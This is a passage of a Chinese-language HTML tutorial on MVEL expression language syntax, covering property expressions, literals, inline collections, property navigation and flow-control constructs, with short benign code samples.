punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一个MVEL表达式，简单的可以是单个标识符，复杂的则可能是一个充满了方法调用和内部集合创建的庞大的布尔表达式。使用MVEL提供的API。可以动态得到表达式的执行结果。</p><h3 id="1-简单属性表达式"><a href="#1-简单属性表达式" class="headerlink" title="1. 简单属性表达式"></a>1. 简单属性表达式</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java">user<span class="token punctuation">.</span>name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在这个表达式中，我们只有一个标识符（user.name），在MVEL中我们称它为属性表达式，因为表达式的唯一目的就是从上下文中提取出变量或者对象的属性。属性表达式是最常见的用途之一，通过它，MVEL可以用来作为一个高性能，易使用的反射优化器。</p><p>MVEL甚至可以用来计算布尔表达式：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">user<span class="token punctuation">.</span>name <span class="token operator">==</span>'<span class="token class-name">John</span> <span class="token class-name">Doe</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>与Java一样，MVEL支持所有优先级规则，包括通过括号来控制执行顺序。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">(</span>user<span class="token punctuation">.</span>name <span class="token operator">==</span> '<span class="token class-name">John</span> <span class="token class-name">Doe</span>'<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">20</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-复合语句"><a href="#2-复合语句" class="headerlink" title="2. 复合语句"></a>2. 复合语句</h3><p>您可以使用分号来表示语句的终止，使用任意数量的语句编写脚本。分号在所有情况下都是必需的，除非在脚本中只有一个语句或最后一个语句。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">statement1<span class="token punctuation">;</span> statement2<span class="token punctuation">;</span> statement3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><strong>注意</strong>：statement3语句后可以缺少分号。</p></blockquote><p>另外，换行不能替代分号来作为一个语句的结束标识。</p><h3 id="3-返回值"><a href="#3-返回值" class="headerlink" title="3. 返回值"></a>3. 返回值</h3><p>MVEL是被设计为一个集成语言作为核心，允许开发人员提供简单的脚本设置绑定和逻辑。因此，MVEL表达式使用“last value out”原则（输出最后值原则）。这意味着，尽管MVEL支持return关键字，但却没必要使用它。例如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>b <span class="token operator">=</span> <span class="token punctuation">(</span>a <span class="token operator">=</span> a <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">;</span>a<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在该示例中，表达式返回a的值，因为<code>a;</code>是表达式的最后一个值。它在功能上与下面的脚本等价：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>b <span class="token operator">=</span> <span class="token punctuation">(</span>a <span class="token operator">=</span> a <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">return</span> a<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="二、值判断"><a href="#二、值判断" class="headerlink" title="二、值判断"></a>二、值判断</h2><p>在MVEL中所有的判断是否相等，都是对值的判断，而没有对引用的判断，因此表达式<code>foo == &#39;bar&#39;</code>等价于Java中的<code>foo.equals(&quot;bar&quot;)</code>。</p><h3 id="1-判断空值"><a href="#1-判断空值" class="headerlink" title="1. 判断空值"></a>1. 判断空值</h3><p>MVEL提供了一个特殊的字符来表示值为空的情况，叫作<code>empty</code>，例如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">foo <span class="token operator">==</span> empty<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>若foo满足空的任何条件，这个表达式值都为true。</p><h3 id="2-判断Null值"><a href="#2-判断Null值" class="headerlink" title="2. 判断Null值"></a>2. 判断Null值</h3><p>MVEL中，<code>null</code>和<code>nil</code>都可以用来表示一个Null值，如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">foo <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">;</span>foo <span class="token operator">==</span> nil<span class="token punctuation">;</span> <span class="token comment">// 和null一样</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-强制转换"><a href="#3-强制转换" class="headerlink" title="3. 强制转换"></a>3. 强制转换</h3><p>当两个不同类型且没有可比性的值进行比较时，MVEL会应用类型强制转换系统，即将左边的值强制转换成右边的值的类型，反之亦然。如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token string">"123"</span> <span class="token operator">==</span> <span class="token number">123</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个表达式的值为true,因为为了执行比较，强制类型转换系统会隐式的将数字<code>123</code>转换成字符串。</p><h2 id="三、内联Lists、Maps和数组Arrays"><a href="#三、内联Lists、Maps和数组Arrays" class="headerlink" title="三、内联Lists、Maps和数组Arrays"></a>三、内联Lists、Maps和数组Arrays</h2><p>MVEL允许你使用简单优雅的语法来表示Lists，Mpas和数组Arrays。 且看下面的示例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">[</span><span class="token string">"Bob"</span> <span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"Bob"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Michael"</span> <span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"Michael"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个表达式的功能等价于：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Map</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"Bob"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"Bob"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"Michael"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"Michael"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>用这种结构描述MVEL内部数据结构，功能非常强大，你可以在任何地方使用它，甚至可以作为方法的参数使用，如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">something<span class="token punctuation">.</span><span class="token function">someMethod</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"foo"</span> <span class="token operator">:</span> <span class="token string">"bar"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="1-Lists"><a href="#1-Lists" class="headerlink" title="1. Lists"></a>1. Lists</h3><p>Lists用以下格式来表示：”[item1, item2, …]”，如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">[</span><span class="token string">"Jim"</span><span class="token punctuation">,</span> <span class="token string">"Bob"</span><span class="token punctuation">,</span> <span class="token string">"Smith"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-Maps"><a href="#2-Maps" class="headerlink" title="2. Maps"></a>2. Maps</h3><p>Maps用以下格式来表示：”[key1 : value1, key2: value2, …]”，如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">[</span><span class="token string">"Foo"</span> <span class="token operator">:</span> <span class="token string">"Bar"</span><span class="token punctuation">,</span> <span class="token string">"Bar"</span> <span class="token operator">:</span> <span class="token string">"Foo"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-数组Arrays"><a href="#3-数组Arrays" class="headerlink" title="3. 数组Arrays"></a>3. 数组Arrays</h3><p>数组Arrays用以下格式来表示：”{item1, item2, …}”，如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">&#123;</span><span class="token string">"Jim"</span><span class="token punctuation">,</span> <span class="token string">"Bob"</span><span class="token punctuation">,</span> <span class="token string">"Smith"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-数组强制转换"><a href="#4-数组强制转换" class="headerlink" title="4. 数组强制转换"></a>4. 数组强制转换</h3><p>关于内联数组，需要知道的一个非常重要的方面是，它可以被强制转换成其它类型的数组，当你声明一个数组时，是不直接指定其类型的，但你可以通过将其传递给一个接收int[]类型参数的方法来指定。如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">foo<span class="token punctuation">.</span><span class="token function">someMethod</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在这种情况下，当MVEL发现目标方法接收的是一个int[]，会自动的将{1,2,3,4}转换成int[]类型。</p><h2 id="四、属性导航"><a href="#四、属性导航" class="headerlink" title="四、属性导航"></a>四、属性导航</h2><p>MVEL属性导航遵循在其他语言（如Groovy，OGNL，EL等）中bean属性表达式中公认惯例的使用方式。和其它语言必须通过底层的方法来控制权限不同的是，MVEL提供了一种单一的，统一的语法来访问属性，静态字段和maps等。</p><h3 id="1-Bean属性"><a href="#1-Bean属性" class="headerlink" title="1. Bean属性"></a>1. Bean属性</h3><p>大多数java开发者都熟悉getter/setter模式，并在java对象中用它来封装属性的访问权限。例如，你可能会通过下面的方式访问一个对象的属性：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">user<span class="token punctuation">.</span><span class="token function">getManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>为了简化此操作，您可以使用以下表达式访问相同的属性：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">user<span class="token punctuation">.</span>manager<span class="token punctuation">.</span>name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><strong>注意：</strong>当一个对象中的字段的作用域是public时，MVEL仍然倾向于通过get方法来访问其属性。</p></blockquote><h3 id="2-Bean的安全属性导航"><a href="#2-Bean的安全属性导航" class="headerlink" title="2. Bean的安全属性导航"></a>2. Bean的安全属性导航</h3><p>有时，当你的表达式中会含有null元素时，这时就需要你进行一个为空判断，否则就会发生错误。当你使用null-safe操作符时你可以简化这个操作：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">user<span class="token punctuation">.</span>?manager<span class="token punctuation">.</span>name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>它的功能相当于：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>user<span class="token punctuation">.</span>manager <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> user<span class="token punctuation">.</span>manager<span class="token punctuation">.</span>name<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-集合"><a href="#3-集合" class="headerlink" title="3. 集合"></a>3. 集合</h3><p>集合的遍历也可以通过简单的语法来实现：</p><h4 id="1-List的访问"><a href="#1-List的访问" class="headerlink" title="(1). List的访问"></a>(1). List的访问</h4><p>List可以像访问数组一样访问，如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">user<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这等价与java中的代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">user<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-Map的访问"><a href="#2-Map的访问" class="headerlink" title="(2). Map的访问"></a>(2). Map的访问</h4><p>Map的访问和访问数组也非常相似，不同的是，在访问Map时索引值可以是任意对象，如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">user<span class="token punctuation">[</span><span class="token string">"foobar"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这等价与java中的代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">user<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"foobar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当Map的key是String类型时，还可以使用特殊的方式来访问，如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">user<span class="token punctuation">.</span>foobar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-字符串作数组"><a href="#4-字符串作数组" class="headerlink" title="4. 字符串作数组"></a>4. 字符串作数组</h3><p>为了能使用属性的索引（迭代也是如此），所有的字符串都可以看成是一个数组，在MVEL中你可以用下面的方式来获取一个字符串变量的第一个字符：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">foo <span class="token operator">=</span> <span class="token string">"My String"</span><span class="token punctuation">;</span>foo<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// returns 'M'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="五、文字常量"><a href="#五、文字常量" class="headerlink" title="五、文字常量"></a>五、文字常量</h2><p>在脚本语言中，一段文字（常量）用来代表一个固定的值。</p><h3 id="1-字符串常量"><a href="#1-字符串常量" class="headerlink" title="1. 字符串常量"></a>1. 字符串常量</h3><p>字符串常量可以用一对单引号或一对双引号来界定。如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token string">"This is a string literal"</span>'<span class="token class-name">This</span> is also string literal'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="字符串转义字符"><a href="#字符串转义字符" class="headerlink" title="字符串转义字符"></a>字符串转义字符</h4><ul><li>\ - 代表一个反斜杠。</li><li>\n - 换行符</li><li>\r - 回车符</li><li>\u#### - Unicode字符 (如: /uAE00)</li><li>### - 八进制字符 (如: /73)</li></ul><h3 id="2-数字常量"><a href="#2-数字常量" class="headerlink" title="2. 数字常量"></a>2. 数字常量</h3><p>整数可以表示为十进制（基数为10），8进制（基数为8），或十六进制（基数为16）。</p><p>一个十进制数字，不从零开始（相对于8进制、16进制而言），可以表示任意数，如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">125</span> <span class="token comment">// 十进制</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一个八进制数，以0为前缀，后面跟着0到7内的数字。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">0353</span> <span class="token comment">// 八进制</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一个十六进制，以0X为前缀，后面可以跟着0-9，A-F范围内的数字。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">0xAFF0</span> <span class="token comment">// 十六进制</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-浮点型常量"><a href="#3-浮点型常量" class="headerlink" title="3. 浮点型常量"></a>3. 浮点型常量</h3><p>浮点数由整数和由点/周期字符表示的小数部分组成，带有可选的类型后缀。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">10.503</span> <span class="token comment">// double型</span><span class="token number">94.92d</span> <span class="token comment">// double型</span><span class="token number">14.5f</span> <span class="token comment">// float型</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="4-大数字常量"><a href="#4-大数字常量" class="headerlink" title="4. 大数字常量"></a>4. 大数字常量</h3><p>您可以使用后缀B和I（必须大写）来表示BigDecimal和BigInteger文字，如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">104.39484</span>B <span class="token comment">// BigDecimal</span><span class="token number">8.4</span>I <span class="token comment">// BigInteger</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="5-布尔常量"><a href="#5-布尔常量" class="headerlink" title="5. 布尔常量"></a>5. 布尔常量</h3><p>布尔型常量用保留关键字true和false来表示。</p><h3 id="6-空常量"><a href="#6-空常量" class="headerlink" title="6. 空常量"></a>6. 空常量</h3><p>用null或nil来表示。</p><h2 id="六、类型常量"><a href="#六、类型常量" class="headerlink" title="六、类型常量"></a>六、类型常量</h2><p>类型常量的处理方式与Java中的相同，格式为：”<PackageName>.<ClassName>“。</p><p>所以一个类可以这样限定：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>HashMap</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者如果类已经通过或者通过外部配置被导入，则它被简单地通过其非限定名称来引用：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">HashMap</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="嵌套类"><a href="#嵌套类" class="headerlink" title="嵌套类"></a>嵌套类</h3><p>嵌套类不能通过MVEL 2.0中的标准点表示法（如Java中）来访问。 相反，你必须用$符号限定这些类。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>proctor<span class="token punctuation">.</span></span>Person</span>$<span class="token class-name">BodyPart</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="七、流程控制"><a href="#七、流程控制" class="headerlink" title="七、流程控制"></a>七、流程控制</h2><p>MVEL的强大已经超出了简单的表达式。事实上，MVEL提供了一系列的程序流程控制操作符来方便你进行高级的脚本操作。</p><h3 id="1-If-Then-Else"><a href="#1-If-Then-Else" class="headerlink" title="1. If-Then-Else"></a>1. If-Then-Else</h3><p>MVEL提供了完整的C/Java式的if-then-else块，如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">var</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Greater than zero!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">var</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Minus one!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Something else!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-三目运算符"><a href="#2-三目运算符" class="headerlink" title="2. 三目运算符"></a>2. 三目运算符</h3><p>其实就是Java中的条件表达式，如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">var</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token string">"Yes"</span> <span class="token operator">:</span> <span class="token string">"No"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以嵌套三目运算符</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">var</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token string">"Yes"</span> <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token keyword">var</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">?</span> <span class="token string">"Minus One!"</span> <span class="token operator">:</span> <span class="token string">"No"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-Foreach"><a href="#3-Foreach" class="headerlink" title="3. Foreach"></a>3. Foreach</h3><p>MVEL的强大特性之一就是其Foreach操作符，在功能和语法上，他都类似于java1.5中的for each操作符，它接收用冒号隔开的两个参数，第一个是当前元素的一个域变量，而第二个是要迭代的集合或数组。如下所示：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>foreach <span class="token punctuation">(</span>name <span class="token operator">:</span> people<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   count<span class="token operator">++</span><span class="token punctuation">;</span>   <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Person #"</span> <span class="token operator">+</span> count <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Total people: "</span> <span class="token operator">+</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为MVEL将字符串视作一个可以迭代的对象，所以你可以用foreach语句来迭代一个字符串（一个字符接一个字符的）：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">str <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">;</span>foreach <span class="token punctuation">(</span>el <span class="token operator">:</span> str<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"["</span><span class="token operator">+</span> el <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的示例将会输出：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">[</span><span class="token class-name">A</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">B</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">C</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">D</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">E</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">F</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">G</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">H</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">I</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">J</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">K</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">L</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">M</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">N</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">O</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">P</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">Q</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">R</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">S</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">T</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">U</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">V</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">W</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">X</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">Y</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">Z</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>你也可以利用MVEL进行计数（从1开始）：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">foreach <span class="token punctuation">(</span>x <span class="token operator">:</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这会输出：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">123456789</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>注意：</strong>像java5.0一样，在MVEL2.0中，可以将foreach简化成关键字for来使用，如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span> <span class="token punctuation">(</span>item <span class="token operator">:</span> collection<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-for循环"><a href="#4-for循环" class="headerlink" title="4. for循环"></a>4. for循环</h3><p>MVEL实现了标准的C语言的for循环：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="5-Do-While-Do-Until"><a href="#5-Do-While-Do-Until" class="headerlink" title="5. Do While, Do Until"></a>5. Do While, Do Until</h3><p>和java中的意义一样，MVEL也实现了Do While,Do Until，While和Until意义正好相反。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">do</span> <span class="token punctuation">&#123;</span>    x <span class="token operator">=</span> <span class="token function">something</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>x <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在语义上相当于：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">do</span> <span class="token punctuation">&#123;</span>   x <span class="token operator">=</span> <span class="token function">something</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>until <span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-While-Until"><a 